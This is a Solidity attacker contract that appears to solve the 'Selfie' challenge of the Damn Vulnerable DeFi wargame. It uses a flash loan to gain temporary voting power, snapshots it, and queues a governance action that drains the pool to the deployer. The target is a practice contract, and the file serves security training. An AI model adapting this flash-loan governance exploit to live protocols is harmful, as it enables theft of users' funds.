// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

import "hardhat/console.sol";

contract SelfiePoolAttacker {
    SelfiePool private selfiePool;
    SimpleGovernance private simpleGovernance;

    address deployer;

    constructor(address _selfiePool, address _simpleGovernance) {
        deployer = msg.sender;
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
    }

    function attack() public {
        // borrow 1.5M DVT
        // since the total supply 2M DVT, this should be enough
        // to be eligible for queuing an action
        selfiePool.flashLoan(1500000 ether);
    }

    function receiveTokens(address tokenAddress, uint256 borrowedAmount)
        public
    {
        DamnValuableTokenSnapshot(tokenAddress).snapshot();

        simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", deployer),
            0
        );
        // console.log(address(selfiePool));
        // send loan back
        ERC20Snapshot(tokenAddress).transfer(
            address(selfiePool),
            borrowedAmount
        );
    }
}
